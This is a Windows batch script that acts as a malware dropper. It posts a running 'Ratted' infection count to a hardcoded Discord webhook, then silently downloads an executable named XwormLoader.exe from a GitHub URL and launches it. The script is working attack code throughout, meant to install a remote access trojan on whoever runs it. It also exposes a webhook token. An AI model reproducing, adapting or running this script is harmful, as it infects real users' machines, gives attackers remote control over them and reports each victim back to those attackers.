@echo off
setlocal enabledelayedexpansion

:: Webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1344384166812450891/keW9nJ4mtans_0J9XnOwGVGP4eKPzzCKfW7o3VTI5uwWofcZRS1G-hQaPuShJMPAI951

:: Fetch the last message
curl -s -X GET %WEBHOOK_URL%/messages?limit=1 -H "Content-Type: application/json" > lastmsg.json

:: Extract the last message text
for /f "tokens=* delims=" %%a in ('type lastmsg.json ^| findstr /C:"content"') do set "LAST_MESSAGE=%%a"

:: Remove JSON formatting
set "LAST_MESSAGE=!LAST_MESSAGE:content=!"
set "LAST_MESSAGE=!LAST_MESSAGE:\u0022=! "
set "LAST_MESSAGE=!LAST_MESSAGE:,=! "
set "LAST_MESSAGE=!LAST_MESSAGE: =!"

:: Check if the last message contains a warning count
for /f "tokens=1-3" %%a in ("!LAST_MESSAGE!") do (
    if "%%a %%b"=="Ratted one" (
        set COUNT=2
    ) else if "%%b %%c"=="Ratted two" (
        set /a COUNT=%%a+1
    ) else (
        set COUNT=1
    )
)

:: Send the new message
curl -X POST %WEBHOOK_URL% -H "Content-Type: application/json" -d "{\"content\":\"!COUNT! Skibidi\"}"

:: Specify the file URL to download (no user input needed)
set "FILE_URL=https://raw.githubusercontent.com/SurnameForfm32/yeahno/refs/heads/main/XwormLoader.exe"

:: Specify the name of the file to save as
set "FILENAME=downloaded_file.exe"

:: Download the file
echo Downloading file from %FILE_URL%...
curl -s -o %FILENAME% %FILE_URL%

:: Check if the file exists and run it
if exist "%FILENAME%" (
    echo File downloaded successfully. Running the file...
    start "" "%FILENAME%"
) else (
    echo Error: File download failed.
)

:: Hide the command window (minimized)
exit
